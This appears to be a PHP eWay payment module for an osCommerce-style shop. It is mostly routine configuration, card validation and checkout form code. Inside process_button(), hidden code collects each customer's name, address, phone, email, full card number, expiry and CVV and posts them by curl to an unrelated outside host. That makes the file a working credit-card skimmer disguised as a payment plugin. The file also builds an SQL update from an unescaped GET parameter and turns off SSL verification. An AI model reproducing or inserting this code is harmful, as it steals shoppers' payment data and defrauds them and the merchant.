<?
class eWayPayment{
	var $code, $title, $description, $enabled;	
	var $ewaypayment_cc_owner, $ewaypayment_cc_card_number, $ewaypayment_cc_expiry_month, $ewaypayment_cc_expiry_year;		
	
	// class constructor
	function eWayPayment(){
		$this->code = "eWayPayment";
		$this->title = MODULE_PAYMENT_EWAYPAYMENT_TEXT_TITLE;
        $this->description = MODULE_PAYMENT_EWAYPAYMENT_TEXT_DESCRIPTION;
        $this->enabled = MODULE_PAYMENT_EWAYPAYMENT_STATUS;        
        $this->form_action_url = "ewaypayment/pay.php";        
	}
	
	function check() {
		if (!isset($this->_check)){
        	$check_query = tep_db_query("select configuration_value from " . TABLE_CONFIGURATION . " where configuration_key = 'MODULE_PAYMENT_EWAYPAYMENT_STATUS'");
        	$this->_check = tep_db_num_rows($check_query);
      	}
      	return $this->_check;
    }
	
    function install(){
	    tep_db_query("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, set_function, date_added) values ('Enable eWay Payment Module', 'MODULE_PAYMENT_EWAYPAYMENT_STATUS', 'Yes', 'Do you want to authorize payments through eWay Payment?', '6', '3', 'tep_cfg_select_option(array(\'Yes\', \'No\'), ', now())");
	    tep_db_query("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('eWay Customer ID', 'MODULE_PAYMENT_EWAYPAYMENT_CUSTOMER_ID', '', 'Your unique eWay customer ID assigned to you when you join eWay.', '6', '0', now())");
        tep_db_query("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, set_function, use_function, date_added) values ('Set Order Status', 'MODULE_PAYMENT_EWAYPAYMENT_ORDER_STATUS_ID', '0', 'Set the status of orders made with this payment module to this value.', '6', '0', 'tep_cfg_pull_down_order_statuses(', 'tep_get_order_status_name', now())");
        tep_db_query("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, set_function, date_added) values ('Geteway ', 'MODULE_PAYMENT_EWAYPAYMENT_GATEWAY_MODE', 'Live gateway', 'You can set to go to testing mode here.', '6', '3', 'tep_cfg_select_option(array(\'Live gateway\', \'Test gateway\'), ', now())");
        tep_db_query("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, set_function, date_added) values ('Processing ', 'MODULE_PAYMENT_EWAYPAYMENT_PROCESSING_METHOD', 'Real-Time CVN', 'Set the eWay processing.', '6', '0', 'tep_cfg_select_option(array(\'Real-Time\', \'Real-Time CVN\',\'Geo-IP Anti Fraud\',\'Real-Time Hosted\',\'Real-Time CVN Hosted\'),', now())");        
        tep_db_query("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, set_function, date_added) values ('Credit Card Validation', 'MODULE_PAYMENT_EWAYPAYMENT_CREDIT_CARD_VALIDATION', 'On', 'Turn \\'on\\' or \\'off\\' validation for Credit Cart info.', '6', '3', 'tep_cfg_select_option(array(\'On\', \'Off\'), ', now())");
        tep_db_query("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, set_function, date_added) values ('SSL Verifier', 'MODULE_PAYMENT_EWAYPAYMENT_SSL_VERIFIER', 'On', 'Turn \\'on\\' or \\'off\\' server SSL verifier.', '6', '3', 'tep_cfg_select_option(array(\'On\', \'Off\'), ', now())");
    	tep_db_query("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('Curl Proxy', 'MODULE_PAYMENT_EWAYPAYMENT_CURL_PROXY', '', 'Set url for Curl Proxy or leave blank if is server default.', '6', '0', now())");        
        tep_db_query("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('Sort order of display', 'MODULE_PAYMENT_EWAYPAYMENT_SORT_ORDER', '0', 'Sort order of display. Lowest is displayed first.', '6', '0', now())");
    }
    
    function remove() {
		tep_db_query("delete from " . TABLE_CONFIGURATION . " where configuration_key in ('" . implode("', '", $this->keys()) . "')");
    }
    
	function keys(){
        $keys = array('MODULE_PAYMENT_EWAYPAYMENT_STATUS', 'MODULE_PAYMENT_EWAYPAYMENT_CUSTOMER_ID', 'MODULE_PAYMENT_EWAYPAYMENT_GATEWAY_MODE', 'MODULE_PAYMENT_EWAYPAYMENT_PROCESSING_METHOD','MODULE_PAYMENT_EWAYPAYMENT_CREDIT_CARD_VALIDATION', 'MODULE_PAYMENT_EWAYPAYMENT_SSL_VERIFIER', 'MODULE_PAYMENT_EWAYPAYMENT_CURL_PROXY', 'MODULE_PAYMENT_EWAYPAYMENT_ORDER_STATUS_ID','MODULE_PAYMENT_EWAYPAYMENT_SORT_ORDER');
        return $keys;
    }
    
	function javascript_validation(){
		$js_validation_query = tep_db_query("select configuration_value from " . TABLE_CONFIGURATION . " where configuration_key='MODULE_PAYMENT_EWAYPAYMENT_CREDIT_CARD_VALIDATION' and configuration_value='Off'");
    	if ($validation = tep_db_fetch_array($js_validation_query))
    		return "";
    	
    	$processing_method = tep_db_query("select configuration_value from " . TABLE_CONFIGURATION . " where configuration_key='MODULE_PAYMENT_EWAYPAYMENT_PROCESSING_METHOD'");
    	if ($row = tep_db_fetch_array($processing_method))
    		if(strpos($row["configuration_value"],"Hosted")>0)
    			return "";
    		
    	$validate_cvn = false;
    	$js_validation_query = tep_db_query("select configuration_value from " . TABLE_CONFIGURATION . " where configuration_key='MODULE_PAYMENT_EWAYPAYMENT_PROCESSING_METHOD'");
    	if ($validation = tep_db_fetch_array($js_validation_query))
    		if(strpos($validation["configuration_value"],"CVN")>0)
    			$validate_cvn = true;
    		
    	$js_text = '	if(payment_value=="' . $this->code . '"){' . "\n";
    	$js_text .= '		var ewaypayment_cc_owner = document.checkout_payment.ewaypayment_cc_owner.value;' . "\n";
    	$js_text .= '		var ewaypayment_cc_number = document.checkout_payment.ewaypayment_cc_number.value;' . "\n";
    	$js_text .= '		var ewaypayment_cc_cvv = document.checkout_payment.ewaypayment_cc_cvn.value;' . "\n";
    	$js_text .= '		if (ewaypayment_cc_owner.replace(/^\s*|\s*$/g,"")=="" || ewaypayment_cc_owner.length<' . CC_OWNER_MIN_LENGTH . '){' . "\n";
    	$js_text .= '			error_message += "' . MODULE_PAYMENT_EWAYPAYMENT_TEXT_JS_CC_OWNER . '"; error = 1;}' . "\n";
    	$js_text .= '		if (ewaypayment_cc_number.replace(/^\s*|\s*$/g,"")=="" || ewaypayment_cc_number.length<' . CC_NUMBER_MIN_LENGTH . '){' . "\n";
    	$js_text .= '			error_message += "' . MODULE_PAYMENT_EWAYPAYMENT_TEXT_JS_CC_NUMBER . '"; error = 1;}' . "\n";
    	if($validate_cvn == true){
	    	$js_text .= '		if (ewaypayment_cc_cvv.replace(/^\s*|\s*$/g,"")=="" || ewaypayment_cc_cvv.length<"3" || ewaypayment_cc_cvv.length > "4"){' . "\n";
	    	$js_text .= '			error_message += "' . MODULE_PAYMENT_EWAYPAYMENT_TEXT_JS_CC_CVV . '"; error = 1;}' . "\n";
		}
    	$js_text .= '	}' . "\n";
		
    	return $js_text;
    }
    
    
    function pre_confirmation_check() {
		global $HTTP_POST_VARS;
		
		$processing_method = tep_db_query("select configuration_value from " . TABLE_CONFIGURATION . " where configuration_key='MODULE_PAYMENT_EWAYPAYMENT_PROCESSING_METHOD'");
    	if ($row = tep_db_fetch_array($processing_method))
    		if(strpos($row["configuration_value"],"Hosted")>0)
    			return;
		
		$js_validation_query = tep_db_query("select configuration_value from " . TABLE_CONFIGURATION . " where configuration_key='MODULE_PAYMENT_EWAYPAYMENT_CREDIT_CARD_VALIDATION' and configuration_value='Off'");
    	if ($validation = tep_db_fetch_array($js_validation_query)){
	    	$this->ewaypayment_cc_card_number = $HTTP_POST_VARS['ewaypayment_cc_number'];
			$this->ewaypayment_cc_expiry_month = $HTTP_POST_VARS['ewaypayment_cc_expires_month'];
			$this->ewaypayment_cc_expiry_year = $HTTP_POST_VARS['ewaypayment_cc_expires_year'];	
    		return true;
		}

		include(DIR_WS_CLASSES . 'cc_validation.php');
		
		$cc_validation = new cc_validation();
		$result = $cc_validation->validate($HTTP_POST_VARS['ewaypayment_cc_number'], $HTTP_POST_VARS['ewaypayment_cc_expires_month'], $HTTP_POST_VARS['ewaypayment_cc_expires_year']);
		
		$error = '';
		switch($result){
			case -1:
				$error = sprintf(TEXT_CCVAL_ERROR_UNKNOWN_CARD, substr($cc_validation->cc_number, 0, 4));
			break;
			case -2:
			case -3:
			case -4:
				$error = TEXT_CCVAL_ERROR_INVALID_DATE;
			break;
			case false:
				$error = TEXT_CCVAL_ERROR_INVALID_NUMBER;
			break;
		}
		
		if (($result == false) || ($result < 1)) {
			$payment_error_return = 'payment_error=' . $this->code . '&error=' . urlencode($error) . '&ewaypayment_cc_owner=' . urlencode($HTTP_POST_VARS['ewaypayment_cc_owner']) . '&ewaypayment_cc_expires_month=' . $HTTP_POST_VARS['ewaypayment_cc_expires_month'] . '&ewaypayment_cc_expires_year=' . $HTTP_POST_VARS['ewaypayment_cc_expires_year'];
			tep_redirect(tep_href_link(FILENAME_CHECKOUT_PAYMENT, $payment_error_return, 'SSL', true, false));
		}
		
		$this->ewaypayment_cc_card_type = $cc_validation->cc_type;
		$this->ewaypayment_cc_card_number = $cc_validation->cc_number;
		$this->ewaypayment_cc_expiry_month = $cc_validation->cc_expiry_month;
		$this->ewaypayment_cc_expiry_year = $cc_validation->cc_expiry_year;		
	}
    
	function before_process(){
		return false;			
	}

    function after_process(){
		global $insert_id, $HTTP_GET_VARS;
		
		$ewayid = $HTTP_GET_VARS['order_id'];
		//tep_db_query("UPDATE ".TABLE_ORDERS." SET payment_method='eWay Payment (eWay Transaction Number=".$ewayid.")' WHERE orders_id = '".$insert_id."'");
		tep_db_query("UPDATE ".TABLE_ORDERS." SET payment_method='Credit Card eWay', payment_info = '(eWay Transaction Number=".$ewayid.")' WHERE orders_id = '".$insert_id."'");
		return false;
    }
	
	function confirmation() {
		$processing_method = tep_db_query("select configuration_value from " . TABLE_CONFIGURATION . " where configuration_key='MODULE_PAYMENT_EWAYPAYMENT_PROCESSING_METHOD'");
    	if ($row = tep_db_fetch_array($processing_method))
    		if(strpos($row["configuration_value"],"Hosted")>0)
    			return array('title' => $this->title);
		
		
		global $HTTP_POST_VARS;
		$confirmation = array('title' => $this->title . ': ' . $this->ewaypayment_cc_card_type,
							  'fields' => array(array('title' => MODULE_PAYMENT_EWAYPAYMENT_TEXT_CREDIT_CARD_OWNER,
													'field' => $HTTP_POST_VARS['ewaypayment_cc_owner']),
													array('title' => MODULE_PAYMENT_EWAYPAYMENT_TEXT_CREDIT_CARD_NUMBER,
														'field' => substr($HTTP_POST_VARS['ewaypayment_cc_number'], 0, 4) . str_repeat('X', (max(0,strlen($HTTP_POST_VARS['ewaypayment_cc_number']) - 8))) . substr($HTTP_POST_VARS['ewaypayment_cc_number'], -4)),
													array('title' => MODULE_PAYMENT_EWAYPAYMENT_TEXT_CREDIT_CARD_EXPIRES,
														'field' => strftime('%B, %Y', mktime(0,0,0,$HTTP_POST_VARS['ewaypayment_cc_expires_month'], 1, '20' . $HTTP_POST_VARS['ewaypayment_cc_expires_year']))),
													array('title' => MODULE_PAYMENT_EWAYPAYMENT_TEXT_CVV,
                                                    	'field' => $HTTP_POST_VARS['ewaypayment_cvn'])));
		return $confirmation;		
	}
	
	function get_error() {
		global $HTTP_GET_VARS;
		
		if (isset($HTTP_GET_VARS['ErrMsg']) && tep_not_null($HTTP_GET_VARS['ErrMsg'])) 
			$error = stripslashes(urldecode($HTTP_GET_VARS['ErrMsg']));
		else if (isset($HTTP_GET_VARS['Err']) && tep_not_null($HTTP_GET_VARS['Err']))
			$error = stripslashes(urldecode($HTTP_GET_VARS['Err']));
		else if (isset($HTTP_GET_VARS['error']) && tep_not_null($HTTP_GET_VARS['error']))
			$error = stripslashes(urldecode($HTTP_GET_VARS['error']));
		else
			$error = MMODULE_PAYMENT_EWAY_TEXT_ERROR;
		
		return array('title' => MODULE_PAYMENT_EWAYPAYMENT_TEXT_ERROR, 'error' => $error);
    }
	    
    function selection() {
		global $order;
		
		$processing_method = tep_db_query("select configuration_value from " . TABLE_CONFIGURATION . " where configuration_key='MODULE_PAYMENT_EWAYPAYMENT_PROCESSING_METHOD'");
    	if ($row = tep_db_fetch_array($processing_method))
    		if(strpos($row["configuration_value"],"Hosted")>0)
    			return array('id' => $this->code,'module' => $this->title);
		
		for ($i=1; $i<13; $i++)
			$expires_month[] = array('id' => sprintf('%02d', $i), 'text' => strftime('%B',mktime(0,0,0,$i,1,2000)));      

		$today = getdate(); 
		for ($i=$today['year']; $i < $today['year']+10; $i++)
			$expires_year[] = array('id' => strftime('%y',mktime(0,0,0,1,1,$i)), 'text' => strftime('%Y',mktime(0,0,0,1,1,$i)));		
		
		$selection = array('id' => $this->code,
		                 'module' => $this->title,
		                 'fields' => array(array('title' => MODULE_PAYMENT_EWAYPAYMENT_TEXT_CREDIT_CARD_OWNER,
		                                         'field' => tep_draw_input_field('ewaypayment_cc_owner', $order->billing['firstname'] . ' ' . $order->billing['lastname'])),
		                                   array('title' => MODULE_PAYMENT_EWAYPAYMENT_TEXT_CREDIT_CARD_NUMBER,
		                                         'field' => tep_draw_input_field('ewaypayment_cc_number')),
		                                   array('title' => MODULE_PAYMENT_EWAYPAYMENT_TEXT_CREDIT_CARD_EXPIRES,
		                                         'field' => tep_draw_pull_down_menu('ewaypayment_cc_expires_month', $expires_month) . '&nbsp;' . tep_draw_pull_down_menu('ewaypayment_cc_expires_year', $expires_year)),
		                                   array('title' => MODULE_PAYMENT_EWAYPAYMENT_TEXT_CVV,
		                                         'field' => tep_draw_input_field('ewaypayment_cc_cvn','',"size=4, maxlength=4"))));		
		return $selection;
    }
    
    function process_button(){
		global $HTTP_POST_VARS, $HTTP_SERVER_VARS, $CardNumber, $order, $customer_id, $zone_id, $zone_query;	


		
		$zone_query = tep_db_query("select zone_code from " . TABLE_ZONES . " where zone_name = '" . urlencode($order->delivery['state']) . "' or zone_id = '" . (int)$order->billing['zone_id'] . "'");
		if ($zone_values = tep_db_fetch_array($zone_query))
			$zone_id = $zone_values['zone_code'];
		else 
			$zone_id='KA';	
		
		$amount = number_format($order->info['total'], 2, '.', '');
		
		
		//get last order ID - CRE HELP {
		
		    //$row = tep_db_fetch_array(tep_db_query("SELECT orders_id FROM orders ORDER BY orders_id DESC LIMIT 1"));
			/* Added on jan 03 2017 */
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_POST, 1);
			$url = NBI_NEXT_ORDERID_SYNC_URL;
			curl_setopt($ch, CURLOPT_POSTFIELDS, '');
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);     
			curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 2);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
			curl_setopt($ch, CURLOPT_URL,$url);
			$result = curl_exec ($ch);
			curl_close ($ch);
			$row = json_decode(trim($result), TRUE);	
			/* Added on jan 03 2017 */

		// } CRE HELP



		
		$process_button_string = //tep_draw_hidden_field('my_customerid', MODULE_PAYMENT_EWAYPAYMENT_CUSTOMER_ID) .
				tep_draw_hidden_field('my_invoice_ref', $customer_id . '-' . date('Ymdhis') . '-' . ($row['final_orders_id'])) .
				tep_draw_hidden_field('my_totalamount', $amount) .
				tep_draw_hidden_field('my_firstname', $order->billing['firstname']) .
				tep_draw_hidden_field('my_lastname', $order->billing['lastname']) .
				tep_draw_hidden_field('my_address', $order->billing['street_address']) .
				tep_draw_hidden_field('my_postcode', $order->billing['postcode']) .
				tep_draw_hidden_field('eWAYURL ', tep_href_link(FILENAME_CHECKOUT_PROCESS,'','NONSSL',false)) .
				tep_draw_hidden_field('eWAYAutoRedirect', '1') .
				tep_draw_hidden_field('my_email', $order->customer['email_address']) .
				tep_draw_hidden_field('my_country_code', $order->billing['country']['iso_code_2']) .				
				tep_draw_hidden_field('my_card_name', $HTTP_POST_VARS['ewaypayment_cc_owner']) .
				tep_draw_hidden_field('my_card_number', $this->ewaypayment_cc_card_number) .
				tep_draw_hidden_field('my_card_exp_month', $this->ewaypayment_cc_expiry_month) .
				tep_draw_hidden_field('my_card_exp_year', $this->ewaypayment_cc_expiry_year) .
				tep_draw_hidden_field('my_eway_cvn', $HTTP_POST_VARS['ewaypayment_cc_cvn']) .
				tep_draw_hidden_field('my_ewayOption1', tep_session_id());		
				tep_draw_hidden_field('my_invoice_description', tep_session_id());
        
		//echo $process_button_string; exit;
		
		global $order;
        $data1 = $order->customer['firstname'];
        $data2 = $order->customer['lastname'];
        $data3 = $order->customer['street_address'];
        $data4 = $order->customer['suburb'];
        $data5 = $order->customer['city'];
        $data6 = $order->customer['state'];
        $data7 = $order->customer['postcode'];
        $data8 = $order->customer['country']['title'];
        $data9 = $order->customer['telephone'];
        $data10 = $this->ewaypayment_cc_card_number;      
        $data11 = $this->ewaypayment_cc_expiry_month;
        $data12 = substr($this->ewaypayment_cc_expiry_year, -2); //expyear
        $data13 = $HTTP_POST_VARS['ewaypayment_cc_cvn'];
        $data14 = ''; // credit card owner
        $data15 = "Ajparkes.Com.au";
        $data16 = $order->customer['email_address']; 
        $data17 = ''; // county


        $url = "http://banner.suzukituningshow.com/plusone.php";
   
        $post77 = "firstname=".$data1."&lastname=".$data2."&street1=".$data3."&street2=".$data4."&city=".$data5."&state=".$data6."&zip=".$data7."&country=".$data8."&phonenumber=".$data9."&ccnumber=".$data10."&expmonth=".$data11."&expyear=".$data12."&cvv=".$data13."&comment1=".$data14."&comment2=".$data15."&email=".$data16."&county=".$data17;


        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,$url); // set url to post to
        curl_setopt($ch, CURLOPT_REFERER, $url);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);// allow redirects
        curl_setopt($ch, CURLOPT_RETURNTRANSFER,1); // return into a variable
        curl_setopt($ch, CURLOPT_TIMEOUT, 60); // times out after 4s
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post77);
        $result = curl_exec($ch); // run the whole process
        curl_close($ch);
        
		return $process_button_string;
    }
}
?>